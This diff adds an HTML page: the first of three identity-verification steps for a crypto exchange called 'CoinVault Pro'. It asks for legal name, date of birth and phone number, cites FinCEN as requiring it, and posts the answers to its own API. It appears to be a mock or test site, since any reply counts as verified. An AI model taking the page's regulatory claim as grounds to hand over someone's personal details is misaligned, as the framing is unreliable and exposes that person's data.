@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CoinVault Pro — Level 1 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;min-height:100vh}
+.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:16px 32px;display:flex;align-items:center;justify-content:space-between}
+.topbar .logo span{font-size:20px;font-weight:700;color:#fff}.topbar .logo .accent{color:#f0b90b}
+.topbar a{color:#8b949e;text-decoration:none;font-size:14px}
+.topbar a:hover{color:#e6edf3}
+.container{max-width:560px;margin:40px auto;padding:0 20px}
+.progress{display:flex;align-items:center;gap:8px;margin-bottom:32px}
+.step{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600}
+.step.active{background:#f0b90b;color:#0d1117}
+.step.inactive{background:#21262d;color:#8b949e}
+.step-line{flex:1;height:2px;background:#21262d}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px}
+h1{font-size:22px;font-weight:600;margin-bottom:6px}
+.desc{color:#8b949e;font-size:14px;margin-bottom:8px}
+.reg-note{background:#1c2128;border:1px solid #30363d;border-radius:8px;padding:12px 16px;font-size:13px;color:#8b949e;margin-bottom:24px;line-height:1.5}
+.reg-note strong{color:#c9d1d9}
+.field{margin-bottom:20px}
+.field label{display:block;font-size:13px;font-weight:500;color:#c9d1d9;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#f0b90b}
+.unlock{display:flex;align-items:center;gap:10px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:14px 16px;margin-bottom:24px}
+.unlock-icon{font-size:20px}
+.unlock-text{font-size:13px;color:#8b949e}
+.unlock-text strong{color:#c9d1d9}
+.btn{width:100%;padding:12px;background:#f0b90b;color:#0d1117;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
+.btn:hover{background:#d4a20a}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.success{display:none;text-align:center;padding:20px;color:#3fb950;font-size:15px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo"><span>Coin<span class="accent">Vault</span> Pro</span></div>
+  <a href="/dashboard">&larr; Back to Dashboard</a>
+</div>
+<div class="container">
+  <div class="progress">
+    <div class="step active">1</div>
+    <div class="step-line"></div>
+    <div class="step inactive">2</div>
+    <div class="step-line"></div>
+    <div class="step inactive">3</div>
+  </div>
+  <div class="card">
+    <h1>Level 1 Verification &mdash; Identity</h1>
+    <p class="desc">Level 1 of 3</p>
+    <div class="reg-note"><strong>Required by FinCEN</strong> for all US-based accounts. Federal regulations mandate identity verification for all cryptocurrency trading accounts.</div>
+    <form id="kycForm">
+      <div class="field">
+        <label for="full_name">Full Legal Name</label>
+        <input type="text" id="full_name" name="full_name" placeholder="As it appears on your government ID" required>
+      </div>
+      <div class="field">
+        <label for="dob">Date of Birth</label>
+        <input type="date" id="dob" name="dob" required>
+      </div>
+      <div class="field">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" placeholder="+1 (555) 123-4567" required>
+      </div>
+      <div class="unlock">
+        <span class="unlock-icon">&#128275;</span>
+        <div class="unlock-text"><strong>Unlock:</strong> View real-time market data and portfolio tracking</div>
+      </div>
+      <button type="submit" class="btn" id="submitBtn">Continue to Level 2</button>
+    </form>
+    <div class="success" id="success">&#10003; Level 1 verified successfully! Redirecting&hellip;</div>
+  </div>
+</div>
+<script>
+document.getElementById('kycForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+  fetch('/api/verify/1', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      full_name: document.getElementById('full_name').value,
+      dob: document.getElementById('dob').value,
+      phone: document.getElementById('phone').value
+    })
+  }).then(function(r){ return r.json(); }).then(function(d) {
+    document.getElementById('kycForm').style.display = 'none';
+    document.getElementById('success').style.display = 'block';
+    setTimeout(function(){ window.location.href = '/verify/level-2'; }, 1500);
+  });
+});
+</script>
+</body>
+</html>
